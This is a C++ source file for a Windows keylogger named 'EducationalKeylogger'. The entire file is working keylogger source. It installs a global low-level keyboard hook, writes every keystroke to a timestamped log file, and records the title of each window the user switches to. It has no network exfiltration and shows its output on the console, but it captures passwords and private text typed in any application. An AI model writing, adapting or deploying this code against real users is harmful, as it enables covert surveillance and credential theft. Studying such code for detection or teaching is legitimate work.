#include "keylogger.h"
#include <iostream>
#include <chrono>
#include <iomanip>
#include <sstream>

EducationalKeylogger* EducationalKeylogger::instance = nullptr;

EducationalKeylogger::EducationalKeylogger() {
    instance = this;
    initializeKeyMap();
    setupLogFile();
}

EducationalKeylogger::~EducationalKeylogger() {
    stopMonitoring();
    if (logFile.is_open()) {
        logFile.close();
    }
}

void EducationalKeylogger::initializeKeyMap() {
    keyMap = {
        {VK_BACK, "[BACKSPACE]"},
        {VK_RETURN, "[ENTER]\n"},
        {VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
        {VK_SPACE, " "},
        {VK_TAB, "[TAB]"},
        {VK_SHIFT, "[SHIFT]"},
        {VK_CONTROL, "[CTRL]"},
        {VK_MENU, "[ALT]"},
        {VK_ESCAPE, "[ESC]"},
        {VK_END, "[END]"},
        {VK_HOME, "[HOME]"},
        {VK_LEFT, "[LEFT]"},
        {VK_RIGHT, "[RIGHT]"},
        {VK_UP, "[UP]"},
        {VK_DOWN, "[DOWN]"},
        {VK_PRIOR, "[PGUP]"},
        {VK_NEXT, "[PGDN]"},
        {VK_CAPITAL, "[CAPSLOCK]"},
        {VK_NUMLOCK, "[NUMLOCK]"},
        {VK_LWIN, "[LWIN]"},
        {VK_RWIN, "[RWIN]"},
        {VK_INSERT, "[INSERT]"},
        {VK_DELETE, "[DELETE]"},
        {VK_F1, "[F1]"}, {VK_F2, "[F2]"}, {VK_F3, "[F3]"}, {VK_F4, "[F4]"},
        {VK_F5, "[F5]"}, {VK_F6, "[F6]"}, {VK_F7, "[F7]"}, {VK_F8, "[F8]"},
        {VK_F9, "[F9]"}, {VK_F10, "[F10]"}, {VK_F11, "[F11]"}, {VK_F12, "[F12]"}
    };
}

void EducationalKeylogger::setupLogFile() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    
    std::stringstream filename;
    filename << "educational_log_";
    filename << std::put_time(std::localtime(&time_t), "%Y%m%d_%H%M%S");
    filename << ".txt";
    
    logFilename = filename.str();
    logFile.open(logFilename, std::ios::app);
    
    if (!logFile.is_open()) {
        throw std::runtime_error("Could not create log file");
    }
    
    // Write header with disclaimer
    logFile << "=== KEYLOGGER ===\n";
    logFile << "Created for tracking keys\n";
    logFile << "Start time: " << std::ctime(&time_t) << "\n";
    logFile << "===================================\n\n";
}

LRESULT CALLBACK EducationalKeylogger::keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && instance) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            
            // ESC key to stop monitoring
            if (kbdStruct->vkCode == VK_ESCAPE) {
                std::cout << "\nESC pressed. Stopping monitoring..." << std::endl;
                instance->stopMonitoring();
                PostQuitMessage(0);
                return 1; // Block ESC from reaching other applications
            }
            
            instance->logKeyPress(kbdStruct->vkCode);
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void EducationalKeylogger::logKeyPress(int vkCode) {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    
    static HWND lastForeground = nullptr;
    HWND currentForeground = GetForegroundWindow();
    
    if (currentForeground != lastForeground) {
        logWindowChange();
        lastForeground = currentForeground;
    }
    
    if (keyMap.find(vkCode) != keyMap.end()) {
        logFile << keyMap[vkCode];
        std::cout << keyMap[vkCode] << std::flush;
    } else {
        // Handle regular characters
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        
        WCHAR unicodeChars[5];
        int result = ToUnicode(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), 
                              keyboardState, unicodeChars, 4, 0);
        
        if (result > 0) {
            std::wstring wideStr(unicodeChars, result);
            std::string charStr(wideStr.begin(), wideStr.end());
            logFile << charStr;
            std::cout << charStr << std::flush;
        }
    }
    
    logFile.flush();
}

void EducationalKeylogger::logWindowChange() {
    HWND foreground = GetForegroundWindow();
    if (foreground) {
        char windowTitle[256];
        GetWindowTextA(foreground, windowTitle, sizeof(windowTitle));
        
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        logFile << "\n\n[Window: " << windowTitle << " - " << std::ctime(&time_t) << "]\n";
        std::cout << "\n[Switched to: " << windowTitle << "]" << std::endl;
    }
}

bool EducationalKeylogger::startMonitoring() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(nullptr), 0);
    if (!keyboardHook) {
        throw std::runtime_error("Failed to install keyboard hook");
    }
    
    std::cout << "Monitoring started. Press ESC to stop." << std::endl;
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return true;
}

void EducationalKeylogger::stopMonitoring() {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
    }
}

std::string EducationalKeylogger::getLogContent() const {
    std::ifstream file(logFilename);
    if (file.is_open()) {
        return std::string((std::istreambuf_iterator<char>(file)), 
                          std::istreambuf_iterator<char>());
    }
    return "";
}

void EducationalKeylogger::clearLog() {
    if (logFile.is_open()) {
        logFile.close();
    }
    std::remove(logFilename.c_str());
    setupLogFile();
}